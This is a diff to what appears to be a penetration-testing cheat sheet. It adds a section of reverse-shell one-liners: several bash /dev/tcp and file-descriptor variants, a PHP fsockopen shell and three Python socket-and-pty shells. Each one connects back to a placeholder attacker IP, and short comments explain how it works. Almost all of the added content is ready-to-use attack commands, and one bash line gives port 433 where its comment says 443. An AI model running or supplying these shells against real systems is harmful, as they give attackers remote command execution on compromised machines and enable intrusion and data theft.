@@ -40,6 +40,62 @@ $ ncat --ssl -lnvp 4444
 $ socat -d -d TCP-LISTEN:443 STDOUT
 ```
 
+### Normal bash reverse shell
+
+```bash
+# redirect input & output through tcp to the attacker's IP on port 443
+# combine both standard output and standard error
+$ bash -i >& /dev/tcp/<attacker_ip>/433 0>&1
+```
+
+### Bash read line reverse shell
+
+```bash
+# creates a new file descriptor and connects to a tcp socket.
+# It will read & execute commands from the socket
+# and send output back through the same socket
+$ exec 5<>/dev/tcp/<attacker_ip>/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
+```
+
+### Bash with file descriptor 196 reverse shell
+
+```bash
+# allows the shell to read commands from the network
+# and send output back through the same connection
+$ 0<&196;exec 196<>/dev/tcp/<attacker_ip>/443; sh <&196 >&196 2>&196 
+```
+
+### Bash with file descriptor 5 reverse shell
+
+```bash
+# uses file descriptor 5 to enable interactive session over tcp
+$ bash -i 5<> /dev/tcp/<attacker_ip>/443 0<&5 1>&5 2>&5
+```
+
+### PHP reverse shells
+
+```bash
+# can also use "shell_exec", "system", "passthrough", "popen"
+# instead of "exec"
+$ php -r '$sock=fsockopen("<attacker_ip>",443);exec("sh <&3 >&3 2>&3");'
+```
+
+### Python reverse shells
+
+```bash
+# sets remote host and port as environment variables
+# creates socket connection, duplicates the socket file descriptor
+# for standard input/output
+export RHOST="<attacker_ip>"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+
+# uses the subprocess module to spawn a shell
+# set environment variables
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+
+# creates a socket s, redirects standard input/output/error to the socket
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker_ip>",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
 ### Pipe reverse shell
 
 ```bash
